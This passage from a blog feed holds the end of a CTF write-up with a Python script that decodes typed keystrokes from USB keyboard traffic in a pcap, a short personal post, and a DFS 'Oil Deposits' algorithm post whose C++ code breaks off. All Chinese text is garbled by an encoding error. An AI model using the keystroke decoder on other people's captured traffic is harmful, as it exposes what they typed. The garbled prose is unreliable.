string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"&lt;TAB>"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"&lt;TAB>"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"{"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"}"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"~"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># check argv</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get argv</span>    pcapFilePath <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># get data of pcap</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"tshark -r %s -T fields -e usb.capdata > %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pcapFilePath<span class="token punctuation">,</span> DataFileName<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># read data</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>DataFileName<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            presses<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># handle</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> press <span class="token keyword">in</span> presses<span class="token punctuation">:</span>        Bytes <span class="token operator">=</span> press<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"00"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> normalKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"02"</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># shift key is pressed.</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> shiftKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"01"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">"Ctrl+"</span> <span class="token operator">+</span> shiftKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"[-] Unknow Key : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Found : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># clean the temp data</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm ./%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>DataFileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p>ÂæÖÊõ¥Êñ∞„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write-up </tag>
            
            <tag> ‰ø°ÊÅØÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ÊàëÊòØ‰∏Ä‰∏™ËèúÈ∏°</title>
      <link href="/2018/11/11/%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E8%8F%9C%E9%B8%A1/"/>
      <url>/2018/11/11/%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E8%8F%9C%E9%B8%A1/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="ËèúÈ∏°"><a href="#ËèúÈ∏°" class="headerlink" title="ËèúÈ∏°"></a>ËèúÈ∏°</h1><p>‰Ω†ÊÄé‰πàËøô‰πàËèúÂïäÔºÅÈ∏Ω‰∫Ü‰∫îÂ§©‰∫ÜÔºÅË¶ÅÂÅöÈ¢ìÂ∫üËèúÈ∏°‰∫ÜÂêóüò≠ÔºÅ‰Ω†ÂèàlowÂèàËèúËøò‰∏çÂä™ÂäõÔºåÂèàÊÉ≥ÈöèÊ≥¢ÈÄêÊµÅÔºàÂí∏È±ºÁúüÈ¶ôüòÑÔºâ„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> ÊùÇÊñá </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ÊàëÊòØËèúÈ∏° </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DFSÊ∑±Êêú_Oil_Deposits</title>
      <link href="/2018/11/07/DFS%E6%B7%B1%E6%90%9C-Oil-Deposits/"/>
      <url>/2018/11/07/DFS%E6%B7%B1%E6%90%9C-Oil-Deposits/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="‰∏Ä‰∏™DFSÊ∞¥È¢òÔºàÂØπÊàëÊù•ËØ¥‰∏çÊ∞¥Ôºâ"><a href="#‰∏Ä‰∏™DFSÊ∞¥È¢òÔºàÂØπÊàëÊù•ËØ¥‰∏çÊ∞¥Ôºâ" class="headerlink" title="‰∏Ä‰∏™DFSÊ∞¥È¢òÔºàÂØπÊàëÊù•ËØ¥‰∏çÊ∞¥Ôºâ"></a>‰∏Ä‰∏™DFSÊ∞¥È¢òÔºàÂØπÊàëÊù•ËØ¥‰∏çÊ∞¥Ôºâ</h1><h2 id="Oil-Deposits"><a href="#Oil-Deposits" class="headerlink" title="Oil Deposits"></a>Oil Deposits</h2><pre class=" language-c++"><code class="language-c++">The GeoSurvComp geologic survey company is responsible for detecting underground oil deposits.GeoSurvComp works with one large rectangular region of land at a time, and creates a grid that dividesthe land into numerous square plots. It then analyzes each plot separately, using sensing equipment todetermine whether or not the plot contains oil.A plot containing oil is called a pocket. If two pockets are adjacent, then they are part of thesame oil deposit. Oil deposits can be quite large and may contain numerous pockets. Your job is todetermine how many different oil deposits are contained in a grid.InputThe input file contains one or more grids. Each grid begins with a line containing m and n, the numberof rows and columns in the grid, separated by a single space. If m = 0 it signals the end of the input;otherwise 1 ‚â§ m ‚â§ 100 and 1 ‚â§ n ‚â§ 100. Following this are m lines of n characters each (not countingthe end-of-line characters). Each character corresponds to one plot, and is either ‚Äò*‚Äô, representing theabsence of oil, or ‚Äò@‚Äô, representing an oil pocket.OutputFor each grid, output the number of distinct oil deposits. Two different pockets are part of the sameoil deposit if they are adjacent horizontally, vertically, or diagonally. An oil deposit will not containmore than 100 pockets.</code></pre><p>sample input:</p><pre class=" language-c++"><code class="language-c++">1 1*3 5*@*@***@***@*@*1 8@@****@*5 5 ****@*@@*@*@**@@@@*@@@**@0 0</code></pre><p>sample output:</p><pre class=" language-c++"><code class="language-c++">0122</code></pre><p>ÂºïÁî®‰∏Ä‰∏ãÁôæÂ∫¶ÁôæÁßëÔºö</p><blockquote><p>ËøôÈ¢òËÄÉÂØüÁöÑÊòØDFS(Depth First Search)Ôºö</p><p>Ê∑±Â∫¶‰ºòÂÖàÊêúÁ¥¢ÊòØ‰∏ÄÁßçÂú®ÂºÄÂèëÁà¨Ëô´Êó©Êúü‰ΩøÁî®ËæÉÂ§öÁöÑÊñπÊ≥ï„ÄÇÂÆÉÁöÑÁõÆÁöÑÊòØË¶ÅËææÂà∞Ë¢´ÊêúÁ¥¢ÁªìÊûÑÁöÑÂè∂ÁªìÁÇπ(Âç≥ÈÇ£‰∫õ‰∏çÂåÖÂê´‰ªª‰Ωï<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">Ë∂ÖÈìæ</a>ÁöÑ<a href="https://baike.baidu.com/item/HTML%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">HTMLÊñá‰ª∂</a>) „ÄÇÂú®‰∏Ä‰∏™HTMLÊñá‰ª∂‰∏≠ÔºåÂΩì‰∏Ä‰∏™<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">Ë∂ÖÈìæ</a>Ë¢´ÈÄâÊã©ÂêéÔºåË¢´ÈìæÊé•ÁöÑHTMLÊñá‰ª∂Â∞ÜÊâßË°åÊ∑±Â∫¶‰ºòÂÖàÊêúÁ¥¢ÔºåÂç≥Âú®ÊêúÁ¥¢ÂÖ∂‰ΩôÁöÑË∂ÖÈìæÁªìÊûú‰πãÂâçÂøÖÈ°ªÂÖàÂÆåÊï¥Âú∞ÊêúÁ¥¢ÂçïÁã¨ÁöÑ‰∏ÄÊù°Èìæ„ÄÇÊ∑±Â∫¶‰ºòÂÖàÊêúÁ¥¢Ê≤øÁùÄHTMLÊñá‰ª∂‰∏äÁöÑ<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">Ë∂ÖÈìæ</a>Ëµ∞Âà∞‰∏çËÉΩÂÜçÊ∑±ÂÖ•‰∏∫Ê≠¢ÔºåÁÑ∂ÂêéËøîÂõûÂà∞Êüê‰∏Ä‰∏™HTMLÊñá‰ª∂ÔºåÂÜçÁªßÁª≠ÈÄâÊã©ËØ•HTMLÊñá‰ª∂‰∏≠ÁöÑÂÖ∂‰ªñË∂ÖÈìæ„ÄÇÂΩì‰∏çÂÜçÊúâÂÖ∂‰ªñ<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">Ë∂ÖÈìæ</a>ÂèØÈÄâÊã©Êó∂ÔºåËØ¥ÊòéÊêúÁ¥¢Â∑≤ÁªèÁªìÊùü„ÄÇ</p></blockquote><blockquote><p>ÁªèÂ∏∏ÈÅáÂà∞ÁöÑ‰∏ç‰ªÖÊúâDFSÔºåËøòÊúâBFS(Breadth First Search):</p><p>ÂÆΩÂ∫¶‰ºòÂÖà<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/2988274" target="_blank" rel="noopener">ÊêúÁ¥¢ÁÆóÊ≥ï</a>ÔºàÂèàÁß∞ÂπøÂ∫¶‰ºòÂÖàÊêúÁ¥¢ÔºâÊòØÊúÄÁÆÄ‰æøÁöÑÂõæÁöÑÊêúÁ¥¢ÁÆóÊ≥ï‰πã‰∏ÄÔºåËøô‰∏ÄÁÆóÊ≥ï‰πüÊòØÂæàÂ§öÈáçË¶ÅÁöÑÂõæÁöÑÁÆóÊ≥ïÁöÑÂéüÂûã„ÄÇDijkstra<a href="https://baike.baidu.com/item/%E5%8D%95%E6%BA%90%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/6975204" target="_blank" rel="noopener">ÂçïÊ∫êÊúÄÁü≠Ë∑ØÂæÑ</a>ÁÆóÊ≥ïÂíåPrim<a href="https://baike.baidu.com/item/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91" target="_blank" rel="noopener">ÊúÄÂ∞èÁîüÊàêÊ†ë</a>ÁÆóÊ≥ïÈÉΩÈááÁî®‰∫ÜÂíåÂÆΩÂ∫¶‰ºòÂÖàÊêúÁ¥¢Á±ª‰ººÁöÑÊÄùÊÉ≥„ÄÇÂÖ∂Âà´ÂêçÂèàÂè´BFSÔºåÂ±û‰∫é‰∏ÄÁßçÁõ≤ÁõÆÊêúÂØªÊ≥ïÔºåÁõÆÁöÑÊòØÁ≥ªÁªüÂú∞Â±ïÂºÄÂπ∂Ê£ÄÊü•Âõæ‰∏≠ÁöÑÊâÄÊúâËäÇÁÇπÔºå‰ª•ÊâæÂØªÁªìÊûú„ÄÇÊç¢Âè•ËØùËØ¥ÔºåÂÆÉÂπ∂‰∏çËÄÉËôëÁªìÊûúÁöÑÂèØËÉΩ‰ΩçÁΩÆÔºåÂΩªÂ∫ïÂú∞ÊêúÁ¥¢Êï¥Âº†ÂõæÔºåÁõ¥Âà∞ÊâæÂà∞ÁªìÊûú‰∏∫Ê≠¢„ÄÇ</p><p>BFSÂú®Ê±ÇËß£ÊúÄÁü≠Ë∑ØÂæÑÊàñËÄÖÊúÄÁü≠Ê≠•Êï∞‰∏äÊúâÂæàÂ§öÁöÑÂ∫îÁî®„ÄÇÂ∫îÁî®ÊúÄÂ§öÁöÑÊòØÂú®Ëµ∞Ëø∑ÂÆ´‰∏ä„ÄÇ</p></blockquote><p>Ê†πÊçÆÈ¢òÊÑèÔºåÊàë‰ª¨ÈúÄË¶ÅÂêëÂÖ´‰∏™ÊñπÂêëËøõË°åÊêúÁ¥¢ÔºåÂπ∂‰∏îËøõË°åÂà§Êñ≠</p><p>ÂèØ‰ª•Áî®c++ÂÜôÂá∫Ôºö</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ÂÆö‰πâÂÖ®Â±ÄÁöÑÔºåmÂíån</span><span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//‰∏ªÂáΩÊï∞</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>flag<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//Êé•ÂèóÂ§öÁªÑÊï∞ÊçÆ</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> n<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                cin<span class="token operator">>></span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token 